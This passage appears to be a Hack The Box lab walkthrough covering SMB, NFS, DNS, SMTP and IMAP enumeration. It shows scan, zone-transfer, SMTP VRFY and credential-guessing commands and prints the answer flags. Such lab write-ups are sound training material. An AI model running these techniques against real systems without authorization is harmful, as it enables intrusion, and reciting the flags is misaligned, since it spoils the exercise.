<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a>rpcclient $&gt; netsharegetinfo sambashare
</span></code></pre></div></td></tr></table></div>
<p>Results: InFreight SMB v3.1</p>
<p><strong>What is the full system path of that specific share? (format: "/directory/names")</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1"></a>rpcclient $&gt; netsharegetinfo sambashare
</span></code></pre></div></td></tr></table></div>
<p>Results: /home/sambauser</p>
<h4 id="nfs">NFS</h4>
<p><strong>Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1">1</a></span>
<span class="normal"><a href="#__codelineno-56-2">2</a></span>
<span class="normal"><a href="#__codelineno-56-3">3</a></span>
<span class="normal"><a href="#__codelineno-56-4">4</a></span>
<span class="normal"><a href="#__codelineno-56-5">5</a></span>
<span class="normal"><a href="#__codelineno-56-6">6</a></span>
<span class="normal"><a href="#__codelineno-56-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1"></a>sudo nmap $ip -p111,2049 -sV -sC
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2"></a>showmount -e $ip 
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3"></a>mkdir target 
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4"></a>sudo mount -t nfs $ip:/ ./target -o nolock
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5"></a>cd target 
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6"></a>tree .
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7"></a>cat var/nfs/flag.txt 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}</p>
<p><strong>Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1"></a>cat mnt/nfsshare/flag.txt 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}</p>
<h4 id="dns">DNS</h4>
<p><strong>Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-58-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1"></a>dig any inlanefreight.htb @$ip
</span></code></pre></div></td></tr></table></div>
<p>Result:  ns.inlanefreight.htb</p>
<p><strong>Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-59-1">1</a></span>
<span class="normal"><a href="#__codelineno-59-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1"></a>#First, we do an initial transfer zone
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2"></a>dig axfr inlanefreight.htb @$ip
</span></code></pre></div></td></tr></table></div>
<p>Results:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-60-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-60-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-60-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-60-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-60-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-60-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-60-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-60-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-60-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-60-10">10</a></span>
<span class="normal"><a href="#__codelineno-60-11">11</a></span>
<span class="normal"><a href="#__codelineno-60-12">12</a></span>
<span class="normal"><a href="#__codelineno-60-13">13</a></span>
<span class="normal"><a href="#__codelineno-60-14">14</a></span>
<span class="normal"><a href="#__codelineno-60-15">15</a></span>
<span class="normal"><a href="#__codelineno-60-16">16</a></span>
<span class="normal"><a href="#__codelineno-60-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1"></a>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.218.112
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2"></a>;; global options: +cmd
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3"></a>inlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4"></a>inlanefreight.htb.  604800  IN  TXT &quot;MS=ms97310371&quot;
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5"></a>inlanefreight.htb.  604800  IN  TXT &quot;atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU&quot;
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6"></a>inlanefreight.htb.  604800  IN  TXT &quot;v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all&quot;
</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7"></a>inlanefreight.htb.  604800  IN  NS  ns.inlanefreight.htb.
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8"></a>app.inlanefreight.htb.  604800  IN  A   10.129.18.15
</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9"></a>dev.inlanefreight.htb.  604800  IN  A   10.12.0.1
</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10"></a>internal.inlanefreight.htb. 604800 IN   A   10.129.1.6
</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11"></a>mail1.inlanefreight.htb. 604800 IN  A   10.129.18.201
</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12"></a>ns.inlanefreight.htb.   604800  IN  A   127.0.0.1
</span><span id="__span-60-13"><a id="__codelineno-60-13" name="__codelineno-60-13"></a>inlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-60-14"><a id="__codelineno-60-14" name="__codelineno-60-14"></a>;; Query time: 44 msec
</span><span id="__span-60-15"><a id="__codelineno-60-15" name="__codelineno-60-15"></a>;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
</span><span id="__span-60-16"><a id="__codelineno-60-16" name="__codelineno-60-16"></a>;; WHEN: Wed Jul 31 13:57:45 EDT 2024
</span><span id="__span-60-17"><a id="__codelineno-60-17" name="__codelineno-60-17"></a>;; XFR size: 11 records (messages 1, bytes 560)
</span></code></pre></div></td></tr></table></div>
<p>With the result, now we can do a second transfer zone</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-61-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1"></a>dig axfr internal.inlanefreight.htb @$ip
</span></code></pre></div></td></tr></table></div>
<p>Results:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-62-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-62-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-62-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-62-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-62-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-62-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-62-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-62-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-62-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-62-10">10</a></span>
<span class="normal"><a href="#__codelineno-62-11">11</a></span>
<span class="normal"><a href="#__codelineno-62-12">12</a></span>
<span class="normal"><a href="#__codelineno-62-13">13</a></span>
<span class="normal"><a href="#__codelineno-62-14">14</a></span>
<span class="normal"><a href="#__codelineno-62-15">15</a></span>
<span class="normal"><a href="#__codelineno-62-16">16</a></span>
<span class="normal"><a href="#__codelineno-62-17">17</a></span>
<span class="normal"><a href="#__codelineno-62-18">18</a></span>
<span class="normal"><a href="#__codelineno-62-19">19</a></span>
<span class="normal"><a href="#__codelineno-62-20">20</a></span>
<span class="normal"><a href="#__codelineno-62-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1"></a>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr internal.inlanefreight.htb @10.129.218.112
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2"></a>;; global options: +cmd
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3"></a>internal.inlanefreight.htb. 604800 IN   SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4"></a>internal.inlanefreight.htb. 604800 IN   TXT &quot;MS=ms97310371&quot;
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5"></a>internal.inlanefreight.htb. 604800 IN   TXT &quot;HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}&quot;
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6"></a>internal.inlanefreight.htb. 604800 IN   TXT &quot;atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU&quot;
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7"></a>internal.inlanefreight.htb. 604800 IN   TXT &quot;v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all&quot;
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8"></a>internal.inlanefreight.htb. 604800 IN   NS  ns.inlanefreight.htb.
</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9"></a>dc1.internal.inlanefreight.htb. 604800 IN A 10.129.34.16
</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10"></a>dc2.internal.inlanefreight.htb. 604800 IN A 10.129.34.11
</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11"></a>mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12"></a>ns.internal.inlanefreight.htb. 604800 IN A  127.0.0.1
</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13"></a>vpn.internal.inlanefreight.htb. 604800 IN A 10.129.1.6
</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14"></a>ws1.internal.inlanefreight.htb. 604800 IN A 10.129.1.34
</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15"></a>ws2.internal.inlanefreight.htb. 604800 IN A 10.129.1.35
</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16"></a>wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17"></a>internal.inlanefreight.htb. 604800 IN   SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-62-18"><a id="__codelineno-62-18" name="__codelineno-62-18"></a>;; Query time: 44 msec
</span><span id="__span-62-19"><a id="__codelineno-62-19" name="__codelineno-62-19"></a>;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
</span><span id="__span-62-20"><a id="__codelineno-62-20" name="__codelineno-62-20"></a>;; WHEN: Wed Jul 31 13:58:29 EDT 2024
</span><span id="__span-62-21"><a id="__codelineno-62-21" name="__codelineno-62-21"></a>;; XFR size: 15 records (messages 1, bytes 677)
</span></code></pre></div></td></tr></table></div>
<p>Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}</p>
<p><strong>What is the IPv4 address of the hostname DC1?</strong></p>
<p>Get the answer from the response to the previous question. In this case: 10.129.34.16</p>
<p>What is the FQDN of the host where the last octet ends with "x.x.x.203"?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-63-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1"></a>dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
</span></code></pre></div></td></tr></table></div>
<p>Results:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-64-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-64-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-64-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-64-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-64-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-64-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-64-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-64-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-64-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-64-10">10</a></span>
<span class="normal"><a href="#__codelineno-64-11">11</a></span>
<span class="normal"><a href="#__codelineno-64-12">12</a></span>
<span class="normal"><a href="#__codelineno-64-13">13</a></span>
<span class="normal"><a href="#__codelineno-64-14">14</a></span>
<span class="normal"><a href="#__codelineno-64-15">15</a></span>
<span class="normal"><a href="#__codelineno-64-16">16</a></span>
<span class="normal"><a href="#__codelineno-64-17">17</a></span>
<span class="normal"><a href="#__codelineno-64-18">18</a></span>
<span class="normal"><a href="#__codelineno-64-19">19</a></span>
<span class="normal"><a href="#__codelineno-64-20">20</a></span>
<span class="normal"><a href="#__codelineno-64-21">21</a></span>
<span class="normal"><a href="#__codelineno-64-22">22</a></span>
<span class="normal"><a href="#__codelineno-64-23">23</a></span>
<span class="normal"><a href="#__codelineno-64-24">24</a></span>
<span class="normal"><a href="#__codelineno-64-25">25</a></span>
<span class="normal"><a href="#__codelineno-64-26">26</a></span>
<span class="normal"><a href="#__codelineno-64-27">27</a></span>
<span class="normal"><a href="#__codelineno-64-28">28</a></span>
<span class="normal"><a href="#__codelineno-64-29">29</a></span>
<span class="normal"><a href="#__codelineno-64-30">30</a></span>
<span class="normal"><a href="#__codelineno-64-31">31</a></span>
<span class="normal"><a href="#__codelineno-64-32">32</a></span>
<span class="normal"><a href="#__codelineno-64-33">33</a></span>
<span class="normal"><a href="#__codelineno-64-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1"></a>-----   dev.inlanefreight.htb   -----
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2"></a>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3"></a>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4"></a>Host&#39;s addresses:
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5"></a>__________________
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6"></a>
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7"></a>
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8"></a>
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9"></a>Name Servers:
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10"></a>______________
</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11"></a>
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12"></a>ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1
</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13"></a>
</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14"></a>
</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15"></a>Mail (MX) Servers:
</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16"></a>___________________
</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17"></a>
</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18"></a>
</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19"></a>
</span><span id="__span-64-20"><a id="__codelineno-64-20" name="__codelineno-64-20"></a>Trying Zone Transfers and getting Bind Versions:
</span><span id="__span-64-21"><a id="__codelineno-64-21" name="__codelineno-64-21"></a>_________________________________________________
</span><span id="__span-64-22"><a id="__codelineno-64-22" name="__codelineno-64-22"></a>
</span><span id="__span-64-23"><a id="__codelineno-64-23" name="__codelineno-64-23"></a>unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.
</span><span id="__span-64-24"><a id="__codelineno-64-24" name="__codelineno-64-24"></a>
</span><span id="__span-64-25"><a id="__codelineno-64-25" name="__codelineno-64-25"></a>Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
</span><span id="__span-64-26"><a id="__codelineno-64-26" name="__codelineno-64-26"></a>AXFR record query failed: no nameservers
</span><span id="__span-64-27"><a id="__codelineno-64-27" name="__codelineno-64-27"></a>
</span><span id="__span-64-28"><a id="__codelineno-64-28" name="__codelineno-64-28"></a>
</span><span id="__span-64-29"><a id="__codelineno-64-29" name="__codelineno-64-29"></a>Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:
</span><span id="__span-64-30"><a id="__codelineno-64-30" name="__codelineno-64-30"></a>__________________________________________________________________________
</span><span id="__span-64-31"><a id="__codelineno-64-31" name="__codelineno-64-31"></a>
</span><span id="__span-64-32"><a id="__codelineno-64-32" name="__codelineno-64-32"></a>dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
</span><span id="__span-64-33"><a id="__codelineno-64-33" name="__codelineno-64-33"></a>ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
</span><span id="__span-64-34"><a id="__codelineno-64-34" name="__codelineno-64-34"></a>win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203
</span></code></pre></div></td></tr></table></div>
<p>Therefore: win2k.dev.inlanefreight.htb</p>
<h4 id="smtp">SMTP</h4>
<p><strong>Enumerate the SMTP service and submit the banner, including its version as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-65-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1"></a>sudo nmap $ip -sC -sV -p25
</span></code></pre></div></td></tr></table></div>
<p>Results: InFreight ESMTP v2.11</p>
<p><strong>Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-66-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1"></a>for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
</span></code></pre></div></td></tr></table></div>
<p>Results: robin</p>
<h4 id="imap-pop3">IMAP / POP3</h4>
<p><strong>Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-67-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1"></a>sudo nmap $ip -sV -p110,143,993,995 -sC
</span></code></pre></div></td></tr></table></div>
<p>Results: InlaneFreight Ltd</p>
<p><strong>What is the FQDN that the IMAP and POP3 servers are assigned to?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-68-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1"></a>sudo nmap $ip -sV -p110,143,993,995 -sC
</span></code></pre></div></td></tr></table></div>
<p>Results: dev.inlanefreight.htb</p>
<p><strong>Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-69-1">1</a></span>
<span class="normal"><a href="#__codelineno-69-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1"></a>echo $ip inlanefreight.htb dev.inlanefreight.htb &gt;&gt; /etc/hosts
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2"></a>curl -k &#39;imaps://dev.inlanefreight.htb&#39; --user robin:robin -v
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-70-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-70-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-70-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-70-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-70-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-70-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-70-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-70-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-70-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-70-10">10</a></span>
<span class="normal"><a href="#__codelineno-70-11">11</a></span>
<span class="normal"><a href="#__codelineno-70-12">12</a></span>
<span class="normal"><a href="#__codelineno-70-13">13</a></span>
<span class="normal"><a href="#__codelineno-70-14">14</a></span>
<span class="normal"><a href="#__codelineno-70-15">15</a></span>
<span class="normal"><a href="#__codelineno-70-16">16</a></span>
<span class="normal"><a href="#__codelineno-70-17">17</a></span>
<span class="normal"><a href="#__codelineno-70-18">18</a></span>
<span class="normal"><a href="#__codelineno-70-19">19</a></span>
<span class="normal"><a href="#__codelineno-70-20">20</a></span>
<span class="normal"><a href="#__codelineno-70-21">21</a></span>
<span class="normal"><a href="#__codelineno-70-22">22</a></span>
<span class="normal"><a href="#__codelineno-70-23">23</a></span>
<span class="normal"><a href="#__codelineno-70-24">24</a></span>
<span class="normal"><a href="#__codelineno-70-25">25</a></span>
<span class="normal"><a href="#__codelineno-70-26">26</a></span>
<span class="normal"><a href="#__codelineno-70-27">27</a></span>
<span class="normal"><a href="#__codelineno-70-28">28</a></span>
<span class="normal"><a href="#__codelineno-70-29">29</a></span>
<span class="normal"><a href="#__codelineno-70-30">30</a></span>
<span class="normal"><a href="#__codelineno-70-31">31</a></span>
<span class="normal"><a href="#__codelineno-70-32">32</a></span>
<span class="normal"><a href="#__codelineno-70-33">33</a></span>
<span class="normal"><a href="#__codelineno-70-34">34</a></span>
<span class="normal"><a href="#__codelineno-70-35">35</a></span>
<span class="normal"><a href="#__codelineno-70-36">36</a></span>
<span class="normal"><a href="#__codelineno-70-37">37</a></span>
<span class="normal"><a href="#__codelineno-70-38">38</a></span>
<span class="normal"><a href="#__codelineno-70-39">39</a></span>
<span class="normal"><a href="#__codelineno-70-40">40</a></span>
<span class="normal"><a href="#__codelineno-70-41">41</a></span>
<span class="normal"><a href="#__codelineno-70-42">42</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1"></a>* Host dev.inlanefreight.htb:993 was resolved.
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2"></a>* IPv6: (none)
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3"></a>* IPv4: 10.129.42.195
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4"></a>*   Trying 10.129.42.195:993...
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5"></a>* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6"></a>* TLSv1.3 (OUT), TLS handshake, Client hello (1):
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7"></a>* TLSv1.3 (IN), TLS handshake, Server hello (2):
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8"></a>* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9"></a>* TLSv1.3 (IN), TLS handshake, Certificate (11):
</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10"></a>* TLSv1.3 (IN), TLS handshake, CERT verify (15):
</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11"></a>* TLSv1.3 (IN), TLS handshake, Finished (20):
</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12"></a>* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13"></a>* TLSv1.3 (OUT), TLS handshake, Finished (20):
</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14"></a>* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15"></a>* Server certificate:
</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16"></a>*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17"></a>*  start date: Nov  8 23:10:05 2021 GMT
</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18"></a>*  expire date: Aug 23 23:10:05 2295 GMT
</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19"></a>*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20"></a>*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21"></a>*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22"></a>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23"></a>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24"></a>* old SSL session ID is stale, removing
</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25"></a>&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
</span><span id="__span-70-26"><a id="__codelineno-70-26" name="__codelineno-70-26"></a>&gt; A001 CAPABILITY
</span><span id="__span-70-27"><a id="__codelineno-70-27" name="__codelineno-70-27"></a>&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
